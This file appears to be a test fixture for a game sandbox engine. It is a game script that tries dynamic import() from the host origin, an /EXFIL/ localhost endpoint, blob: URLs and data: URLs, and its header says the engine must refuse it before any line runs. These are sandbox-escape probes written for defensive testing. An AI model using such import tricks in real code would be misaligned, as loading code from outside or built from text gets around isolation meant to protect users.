// @title m22 dynamic import — import() to the host origin and import(blob:) (code from text). 0.2.1+: must be refused before any line runs
// @engine 0.2
// @capabilities hud
defineGame({ init(api) {
  const S = location.origin + "/EXFIL/";
  try { import(S + "m.js").catch(() => {}); } catch (e) {}
  try { import(URL.createObjectURL(new Blob(["export default 1"], { type: "text/javascript" }))).catch(() => {}); } catch (e) {}
  try { import("data:text/javascript,export default 1").catch(() => {}); } catch (e) {}
  try { import("http://localhost:8453/EXFIL/mod.js").catch(() => {}); } catch (e) {}
  try { import(location.origin + "/runtime.js").catch(() => {}); } catch (e) {}
  setTimeout(() => api.end({ text: "ran" }), 500);
}, update() {}, render() {} });
